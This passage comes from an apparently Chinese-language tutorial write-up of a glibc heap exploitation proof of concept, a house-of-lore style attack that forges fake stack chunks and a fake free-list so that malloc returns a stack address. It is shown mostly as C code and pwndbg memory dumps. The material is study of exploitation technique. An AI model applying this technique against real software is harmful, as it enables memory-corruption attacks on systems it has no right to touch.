class="number">0x0000555555554fe0</span><span class="number">0x0000555555554760</span></span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x00007fffffffded0</span><span class="number">0xe5db78355322cc00</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们在 stack 上创建 fake free-list（b 64-&gt;c），至于这样创建的原因之后再说：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line">#Create a fake <span class="built_in">free</span>-<span class="built_in">list</span> on the <span class="built_in">stack</span></span><br><span class="line"><span class="meta">#fake free-list at 0x7fffffffdd00</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info local</span><br><span class="line">stack_buffer_1 = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;</span><br><span class="line">stack_buffer_2 = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;</span><br><span class="line">fake_freelist = &#123;&#123;<span class="number">0x0</span>, <span class="number">0x7ffff7ffe710</span>, <span class="number">0x7ffff7b95707</span>, <span class="number">0x7fffffffdd20</span>&#125;, &#123;<span class="number">0x7fffffffdd50</span>, <span class="number">0x7fffffffdd60</span>, <span class="number">0x7ffff7ffea98</span>, <span class="number">0x7fffffffdd40</span>&#125;, &#123;<span class="number">0x4000000000</span>, <span class="number">0x40000000200</span>, <span class="number">0xffffffff</span>, <span class="number">0x7fffffffdd60</span>&#125;, &#123;<span class="number">0x7ffff7ffb2a8</span>, <span class="number">0x7ffff7ffe710</span>, <span class="number">0x0</span>, <span class="number">0x7fffffffdd80</span>&#125;, &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0x7fffffffdda0</span>&#125;, &#123;<span class="number">0x7fffffffde08</span>, <span class="number">0xf0</span>, <span class="number">0x1</span>, <span class="number">0x7fffffffddc0</span>&#125;, &#123;<span class="number">0x7ffff7de3b40</span> &lt;_dl_fini&gt;, <span class="number">0x0</span>, <span class="number">0x555555554fe0</span> &lt;__libc_csu_init&gt;, <span class="number">0x0</span>&#125;&#125;</span><br><span class="line">victim = <span class="number">0x555555757260</span></span><br><span class="line">dummies = &#123;<span class="number">0x555555757370</span>, <span class="number">0x555555757480</span>, <span class="number">0x555555757590</span>, <span class="number">0x5555557576a0</span>, <span class="number">0x5555557577b0</span>, <span class="number">0x5555557578c0</span>, <span class="number">0x5555557579d0</span>&#125;</span><br><span class="line">victim_chunk = <span class="number">0x555555757250</span></span><br><span class="line">p5 = <span class="number">0x7fffffffdd60</span></span><br><span class="line">p2 = <span class="number">0x3</span></span><br><span class="line">p3 = <span class="number">0x7fffffffdd50</span></span><br><span class="line">p4 = <span class="number">0x0</span></span><br><span class="line">sc = <span class="number">140737354117512</span></span><br><span class="line">__PRETTY_FUNCTION__ = <span class="string">&quot;main&quot;</span></span><br><span class="line">pwndbg&gt; x/<span class="number">30</span>gx fake_freelist</span><br><span class="line"><span class="number">0x7fffffffdd00</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7ffe710</span></span><br><span class="line"><span class="number">0x7fffffffdd10</span>:<span class="number">0x00007ffff7b95707</span><span class="number">0x00007fffffffdd20</span> #fake_freelist[<span class="number">0</span>][<span class="number">3</span>]</span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x7fffffffdd20</span>:<span class="number">0x00007fffffffdd50</span><span class="number">0x00007fffffffdd60</span></span><br><span class="line"><span class="number">0x7fffffffdd30</span>:<span class="number">0x00007ffff7ffea98</span><span class="number">0x00007fffffffdd40</span> #fake_freelist[<span class="number">1</span>][<span class="number">3</span>]</span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x7fffffffdd40</span>:<span class="number">0x0000004000000000</span><span class="number">0x0000040000000200</span></span><br><span class="line"><span class="number">0x7fffffffdd50</span>:<span class="number">0x00000000ffffffff</span><span class="number">0x00007fffffffdd60</span> #fake_freelist[<span class="number">2</span>][<span class="number">3</span>]</span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x7fffffffdd60</span>:<span class="number">0x00007ffff7ffb2a8</span><span class="number">0x00007ffff7ffe710</span></span><br><span class="line"><span class="number">0x7fffffffdd70</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007fffffffdd80</span> #fake_freelist[<span class="number">3</span>][<span class="number">3</span>]</span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x7fffffffdd80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x0000000000000009</span><span class="number">0x00007fffffffdda0</span> #fake_freelist[<span class="number">4</span>][<span class="number">3</span>]</span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x00007fffffffde08</span><span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffddc0</span> #fake_freelist[<span class="number">5</span>][<span class="number">3</span>]</span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x00007ffff7de3b40</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x0000555555554fe0</span><span class="number">0x0000000000000000</span> #fake_freelist[<span class="number">6</span>][<span class="number">3</span>]</span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x00007fffffffded0</span><span class="number">0xe5db78355322cc00</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来开始在 stack_buffer_1 上伪造 fake_chunk（b 71-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">       <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#修改前：</span><br><span class="line">pwndbg&gt;  x/<span class="number">16</span>gx stack_buffer_1</span><br><span class="line"><span class="number">0x7fffffffdca0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcb0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcc0</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757480</span></span><br><span class="line"><span class="number">0x7fffffffdcd0</span>:<span class="number">0x0000555555757590</span><span class="number">0x00005555557576a0</span></span><br><span class="line"><span class="number">0x7fffffffdce0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x00005555557578c0</span></span><br><span class="line"><span class="number">0x7fffffffdcf0</span>:<span class="number">0x00005555557579d0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd00</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7ffe710</span></span><br><span class="line"><span class="number">0x7fffffffdd10</span>:<span class="number">0x00007ffff7b95707</span><span class="number">0x00007fffffffdd20</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">#修改后：</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx stack_buffer_1</span><br><span class="line"><span class="number">0x7fffffffdca0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    #stack_buffer_1[<span class="number">0</span>]  #stack_buffer_1[<span class="number">1</span>]</span><br><span class="line"><span class="number">0x7fffffffdcb0</span>:<span class="number">0x0000555555757250</span><span class="number">0x0000000000000000</span></span><br><span class="line">    #stack_buffer_1[<span class="number">2</span>]</span><br><span class="line"><span class="number">0x7fffffffdcc0</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757480</span></span><br><span class="line"><span class="number">0x7fffffffdcd0</span>:<span class="number">0x0000555555757590</span><span class="number">0x00005555557576a0</span></span><br><span class="line"><span class="number">0x7fffffffdce0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x00005555557578c0</span></span><br><span class="line"><span class="number">0x7fffffffdcf0</span>:<span class="number">0x00005555557579d0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd00</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7ffe710</span></span><br><span class="line"><span class="number">0x7fffffffdd10</span>:<span class="number">0x00007ffff7b95707</span><span class="number">0x00007fffffffdd20</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>之后我们再次设置 stack_buffer_1 和 stack_buffer_2（b 81-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">       <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">       <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">        <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">stack_buffer_2[<span class="number">3</span>] = (<span class="keyword">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#修改前：</span><br><span class="line">pwndbg&gt;  x/<span class="number">16</span>gx stack_buffer_2</span><br><span class="line"><span class="number">0x7fffffffdc80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdc90</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7ffe710</span></span><br><span class="line"><span class="number">0x7fffffffdca0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcb0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcc0</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757480</span></span><br><span class="line"><span class="number">0x7fffffffdcd0</span>:<span class="number">0x0000555555757590</span><span class="number">0x00005555557576a0</span></span><br><span class="line"><span class="number">0x7fffffffdce0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x00005555557578c0</span></span><br><span class="line"><span class="number">0x7fffffffdcf0</span>:<span class="number">0x00005555557579d0</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">#修改后：</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx stack_buffer_2</span><br><span class="line"><span class="number">0x7fffffffdc80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdc90</span>:<span class="number">0x00007fffffffdca0</span><span class="number">0x00007fffffffdd00</span></span><br><span class="line">    #stack_buffer_2[<span class="number">2</span>]  #stack_buffer_2[<span class="number">3</span>]</span><br><span class="line"><span class="number">0x7fffffffdca0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcb0</span>:<span class="number">0x0000555555757250</span><span class="number">0x00007fffffffdc80</span></span><br><span class="line"><span class="number">0x7fffffffdcc0</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757480</span></span><br><span class="line"><span class="number">0x7fffffffdcd0</span>:<span class="number">0x0000555555757590</span><span class="number">0x00005555557576a0</span></span><br><span class="line"><span class="number">0x7fffffffdce0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x00005555557578c0</span></span><br><span class="line"><span class="number">0x7fffffffdcf0</span>:<span class="number">0x00005555557579d0</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx stack_buffer_1</span><br><span class="line"><span class="number">0x7fffffffdca0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcb0</span>:<span class="number">0x0000555555757250</span><span class="number">0x00007fffffffdc80</span></span><br><span class="line">    #stack_buffer_1[<span class="number">3</span>]</span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x7fffffffdcc0</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757480</span></span><br><span class="line"><span class="number">0x7fffffffdcd0</span>:<span class="number">0x0000555555757590</span><span class="number">0x00005555557576a0</span></span><br><span class="line"><span class="number">0x7fffffffdce0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x00005555557578c0</span></span><br><span class="line"><span class="number">0x7fffffffdcf0</span>:<span class="number">0x00005555557579d0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd00</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7ffe710</span></span><br><span class="line"><span class="number">0x7fffffffdd10</span>:<span class="number">0x00007ffff7b95707</span><span class="number">0x00007fffffffdd20</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们伪造了 stack_buffer_1 和 stack_buffer_2，stack_buffer_1 是为了之后修改 smallbin 的 bk 指针到此处，stack_buffer_2 主要是连接之后的 fake_free_list；做着两步都是为了之后在 malloc smallbin 中的 free chunk 时绕过检查因为之前修改了 bk 指针。接下来我们创建 malloc(1000)的堆块<del>防止在 free 时对之前 malloc 出的堆块造成影响（主要考虑 top_chunk）</del>（b 87-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">       <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">500</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim</span><br><span class="line">#victim_chunk==<span class="number">0x555555757250</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">0</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">1</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">2</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">3</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">4</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">5</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">6</span>]</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000003f1</span> #large_chunk--<span class="built_in">malloc</span>(<span class="number">1000</span>)--p5</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ec0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020141</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757f90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>下面的代码开始对 POC 开头创建的 chunk_dummies 进行 free 以填充满对应大小链表的 tcachebin，完成 free 之后 free chunk_victim（b 92-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line">#Freeing dummy chunk</span><br><span class="line">#Freeing the chunk <span class="number">0x555555757260</span>, it will be inserted in the unsorted bin</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620986290875-8aced23b-0f61-4100-93f0-095906a98fd3.png#clientId=u5bcede89-c135-4&from=drop&id=ub0366bca&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2017.58.07.png&originHeight=672&originWidth=2746&originalType=binary&size=95311&status=done&style=none&taskId=ub23e0c73-a1a4-43a3-9fb3-c06d3ea2abf" alt="截屏2021-05-14 17.58.07.png"><br>如上图所示，chunk_victim 现在已经进入到了 unsortedbin 中，此时的内存状况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">500</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0700000000000000</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557570c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555557579d0</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim(<span class="built_in">free</span>-unsortedbin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">#victim_chunk==<span class="number">0x555555757250</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000110</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">0</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">1</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757480</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">2</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757590</span>:<span class="number">0x0000555555757480</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">3</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576a0</span>:<span class="number">0x0000555555757590</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">4</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557577b0</span>:<span class="number">0x00005555557576a0</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">5</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557578c0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">6</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557579d0</span>:<span class="number">0x00005555557578c0</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000003f1</span> #large_chunk--<span class="built_in">malloc</span>(<span class="number">1000</span>)--p5</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ec0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020141</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757f90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>printf 一些消息（b 99-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">#In the unsorted bin the victim<span class="number">&#x27;</span>s fwd <span class="keyword">and</span> bk pointers are nil</span><br><span class="line"><span class="meta">#victim-&gt;fwd: 